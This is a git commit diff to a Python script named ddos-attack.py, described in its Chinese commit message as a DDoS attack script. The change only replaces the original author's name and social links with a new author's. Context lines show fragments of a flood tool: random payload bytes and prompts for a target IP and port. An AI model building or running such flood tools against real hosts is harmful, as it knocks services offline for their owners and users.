cd619319404928ef9ad9726c2c05dd13ae2a8fb1
lixiang <lixiang007top@163.com>
2021-09-10 15:24:20 +0800

    DDOS攻击Python脚本

--- ddos-attack.py
+++ ddos-attack.py
@@ -20,10 +20,8 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "Author   : Li Xiang"
+print "github   : https://github.com/lixiang007666"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
